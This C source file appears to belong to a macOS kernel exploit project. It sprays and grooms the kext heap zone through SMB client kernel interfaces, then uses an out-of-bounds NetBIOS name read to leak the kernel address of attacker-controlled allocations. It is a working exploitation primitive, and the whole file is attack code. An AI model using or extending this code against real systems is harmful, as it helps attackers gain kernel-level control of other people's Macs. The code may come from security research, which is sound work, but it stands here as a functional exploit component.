//
//  zalloc_kext_small.c
//  kmem_xepg
//
//  Created by admin on 12/27/21.
//

#include <assert.h>
#include <stdlib.h>
#include <string.h>

#include <dispatch/dispatch.h>
#include <sys/proc_info.h>
#include <sys/errno.h>

#include <xe/util/misc.h>
#include <xe/util/log.h>
#include <xe/util/assert.h>

#include "../smb/nic_allocator.h"
#include "../smb/ssn_allocator.h"
#include "../external/smbfs/netbios.h"

#include "zkext_alloc_small.h"
#include "kmem_neighbor_reader.h"
#include "allocator_rw.h"
#include "allocator_prpw.h"

#include "macos_params.h"


#define NUM_PAD_ELEMENTS (XE_PAGE_SIZE / 32)
#define NUM_GAP_ELEMENTS (XE_PAGE_SIZE / 32 * 2)

#define MAX_TRIES 5
#define MAX_SESSIONS 5

const int zone_kext_sizes[] = {
    16, 32, 48, 64, 80, 96, 128, 160, 192, 224, 256
};


/*
 * --- Allocates memory (upto 256 bytes) from `KHEAP_KEXT` zone
 * --- Address of allocated memory can be read
 * --- Data after first 8 bytes can be controlled
 */


// Scan the netbios name for `struct sock_addr_entry` with `addr` field
int kmem_zkext_alloc_small_scan_nb_name(char* name, size_t len, uint16_t z_elem_size, uintptr_t* out) {
    static_assert(sizeof(struct sock_addr_entry) > 16 && sizeof(struct sock_addr_entry) <= 32, "");
    uint8_t sock_addr_entry_zone = 32;
    /// We  only need the data of `struct sock_addr_entry`. The netbios name consist of data from
    /// `snb_name` field of `struct sockaddr_nb` and data of succeding `struct sock_addr_entry`
    ///
    ///         struct sockaddr_nb  (snb_len = 32)                                 struct sock_addr_entry
    ///  ------------------------------------------------------------------- -------------------------------------------------------------------
    ///  | snb_len + snb_family + snb_addrin + snb_name | |      addr        +            next               +     empty    |
    ///  ------------------------------------------------------------------- -------------------------------------------------------------------
    ///                              <=======>
    ///                               skip_bytes
    ///                              <====================================>
    ///                                              len
    int skip_bytes = sock_addr_entry_zone - offsetof(struct sockaddr_nb, snb_name);
    int read_bytes = sizeof(struct sock_addr_entry);
    if (len < skip_bytes + read_bytes) {
        return ENOENT;
    }
    
    struct sock_addr_entry entry;
    /// Copy `addr` field to ptr
    memcpy(&entry, name + skip_bytes, sizeof(entry));
    
    uintptr_t allocated_address = (uintptr_t)entry.addr;
    if (XE_VM_KERNEL_ADDRESS_VALID(allocated_address) && allocated_address % z_elem_size == 0) {
        *out = allocated_address;
        return 0;
    }
    
    return ENOENT;
}

// TODO: refactor API for clarity (first 8 bytes not controllable)
int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, size_t data_size, struct kmem_zkext_alloc_small_entry* out) {
    size_t alloc_size = data_size + 8;
    xe_assert(alloc_size < 256);
    
    int zone_size = -1;
    for (int i = 0; i < XE_ARRAY_SIZE(zone_kext_sizes); i++) {
        if (zone_kext_sizes[i] >= alloc_size) {
            zone_size = zone_kext_sizes[i];
            break;
        }
    }
    xe_assert(zone_size > 0);
    
    smb_nic_allocator gap_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
    kmem_allocator_prpw_t element_allocator = kmem_allocator_prpw_create(smb_addr, NUM_GAP_ELEMENTS);

    for (int gap_idx = 0; gap_idx < NUM_GAP_ELEMENTS; gap_idx++) {
        struct network_nic_info gap_info;
        bzero(&gap_info, sizeof(gap_info));
        gap_info.nic_index = 0;
        gap_info.addr_4.sin_family = AF_INET;
        gap_info.addr_4.sin_len = sizeof(struct sockaddr_in);
        gap_info.addr_4.sin_addr.s_addr = gap_idx;
        
        /// Allocate a placeholder `struct sock_addr_entry` element in kext.kalloc.32 zone
        int error = smb_nic_allocator_allocate(gap_allocator, &gap_info, 1, sizeof(gap_info));
        xe_assert_err(error);
        
        /// Allocate a `struct sock_addr_entry` element with given data in memory pointed by `entry->addr + 8`
        error = kmem_allocator_prpw_allocate(element_allocator, 1, ^(void* ctx, uint8_t* address_len, sa_family_t* address_family, char** arbitary_data, size_t* arbitary_data_len, size_t index) {
            *address_len = data_size + 8;
            *address_family = AF_INET;
            *arbitary_data = data;
            *arbitary_data_len = data_size;
        }, NULL);
        xe_assert_err(error);
    }
    
    /// Release placeholder elements
    int error = smb_nic_allocator_destroy(&gap_allocator);
    xe_assert_err(error);
    
    uintptr_t value = 0;
    for (int try = 0; try < MAX_TRIES; try++) {
        xe_log_debug("alloc session try %d / %d", try, MAX_TRIES);
        
        static_assert(sizeof(struct sock_addr_entry) > 16 && sizeof(struct sock_addr_entry) <= 32, "");
        uint8_t sock_addr_entry_zone = 32;
        
        /// Value of `sa_len` field of socket address
        uint8_t nb_len = sock_addr_entry_zone + sizeof(struct sock_addr_entry);
        /// `ioc_saddr_len` and `ioc_laddr_len`
        uint32_t ioc_len = sock_addr_entry_zone;
        /// Size of netbios name (`snb_name`) first segment
        uint8_t snb_name = sizeof(struct sock_addr_entry) + (sock_addr_entry_zone - offsetof(struct sockaddr_nb, snb_name));
        
        uint32_t server_name_size = snb_name;
        char server_nb_name[server_name_size];
        
        uint32_t local_name_size = snb_name;
        char local_nb_name[local_name_size];
        
        struct kmem_neighbor_reader_args params;
        params.smb_addr = *smb_addr;
        params.saddr_snb_len = nb_len;
        params.saddr_ioc_len = ioc_len;
        params.saddr_snb_name_seglen = snb_name;
        params.laddr_snb_len = nb_len;
        params.laddr_ioc_len = ioc_len;
        params.laddr_snb_name_seglen = snb_name;
        
        kmem_neighbor_reader_read(&params, server_nb_name, &server_name_size, local_nb_name, &local_name_size);
        xe_assert_cond(server_name_size, ==, snb_name + 2);
        xe_assert_cond(local_name_size, ==, snb_name + 2);
        
        if (!kmem_zkext_alloc_small_scan_nb_name(server_nb_name, sizeof(server_nb_name), zone_size, &value)) {
            break;
        }
        
        if (!kmem_zkext_alloc_small_scan_nb_name(local_nb_name, sizeof(local_nb_name), zone_size, &value)) {
            break;
        }
    }
        
    if (value) {
        out->address = value;
        out->element_allocator = element_allocator;
        return 0;
    } else {
        kmem_allocator_prpw_destroy(&element_allocator);
        return EAGAIN;
    }
}


struct kmem_zkext_alloc_small_entry kmem_zkext_alloc_small(const struct sockaddr_in* smb_addr, char* data, size_t data_size) {
    for (int i = 0; i < MAX_SESSIONS; i++) {
        xe_log_debug("alloc session %d / %d", i, MAX_SESSIONS);
        struct kmem_zkext_alloc_small_entry entry;
        int error = kmem_zkext_alloc_small_try(smb_addr, data, data_size, &entry);
        if (!error) {
            return entry;
        }
    }
    xe_log_error("alloc failed");
    abort();
}
